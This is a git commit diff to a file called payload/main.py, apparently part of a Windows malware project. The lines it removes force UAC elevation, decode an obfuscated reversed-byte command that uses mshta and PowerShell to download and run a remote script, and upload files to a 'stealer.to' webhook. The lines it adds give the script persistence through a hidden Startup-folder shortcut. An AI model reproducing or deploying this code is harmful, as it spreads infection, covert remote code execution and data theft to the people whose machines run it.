7dfcfd4fc600fb90731cc4c4d5ba1999591e5d0d
43a1723 <hai1723notgay@gmail.com>
2024-12-20 16:00:03 +0700

    Update main.py

--- payload/main.py
+++ payload/main.py
@@ -1,35 +1,28 @@
-import os, subprocess, ctypes, sys, getpass
-
-if ctypes.windll.shell32.IsUserAnAdmin() != 1:
-    while not ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1) == 42: print()
-    exit(0)
-  
+import time
+import re
+import pyperclip
+import win32gui
+import win32con
+import winreg as reg
 import os
+import sys
+from win32com.client import Dispatch
 
-command = bytes([41, 101, 115, 111, 108, 99, 46, 119, 111, 100, 110, 105, 119, 40, 41, 48, 44, 34, 34, 34, 120, 101, 105, 32, 124, 32, 41, 39, 49, 115, 112, 46, 100, 97, 111, 108, 110, 119, 111, 100, 47, 110, 105, 97, 109, 47, 116, 115, 101, 116, 47, 51, 50, 55, 49, 97, 51, 52, 47, 109, 111, 99, 46, 116, 110, 101, 116, 110, 111, 99, 114, 101, 115, 117, 98, 117, 104, 116, 105, 103, 46, 119, 97, 114, 47, 47, 58, 115, 112, 116, 116, 104, 39, 40, 114, 119, 105, 34, 34, 32, 100, 110, 97, 109, 109, 111, 99, 45, 32, 108, 108, 101, 104, 115, 114, 101, 119, 111, 112, 34, 40, 110, 117, 82, 46, 41, 34, 108, 108, 101, 104, 83, 46, 116, 112, 105, 114, 99, 83, 87, 34, 40, 116, 99, 101, 106, 98, 79, 101, 116, 97, 101, 114, 67, 58, 116, 112, 105, 114, 99, 115, 98, 118, 32, 97, 116, 104, 115, 109][::-1]).decode()
-os.system(command)
+def add_to_startup():
+    # Get the startup folder path using environment variables
+    startup_folder = os.path.join(os.environ["APPDATA"], "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
+    path = os.path.join(startup_folder, "os.lnk")
+    target = sys.executable.replace("python.exe", "pythonw.exe")
+    wDir = os.path.dirname(os.path.abspath(__file__))
+    icon = sys.executable
 
+    shell = Dispatch('WScript.Shell')
+    shortcut = shell.CreateShortCut(path)
+    shortcut.Targetpath = target
+    shortcut.WorkingDirectory = wDir
+    shortcut.IconLocation = icon
+    shortcut.Arguments = f'-c "{os.path.abspath(__file__)}"'
+    shortcut.save()
 
-import os
-import requests
-
-# Đường dẫn đến webhook Discord
-webhook_url = "https://stealer.to/post?uniqueid=61b4f50c"
-
-# Lấy đường dẫn file hiện tại (__file__)
-file_path = os.path.abspath(__file__)
-
-# Kiểm tra nếu file tồn tại và gửi
-if os.path.exists(file_path):
-    with open(file_path, "rb") as file:
-        # Gửi file qua webhook
-        response = requests.post(
-            webhook_url,
-            files={"file": (os.path.basename(file_path), file)},
-        )
-        if response.status_code == 204:
-            print("Gửi file thành công!")
-        else:
-            print(f"Lỗi khi gửi file: {response.status_code}, {response.text}")
-else:
-    print("File không tồn tại!")
+add_to_startup()
+print(os.path.join(os.environ["APPDATA"], "Microsoft", "Windows", "Start Menu", "Programs", "Startup"))
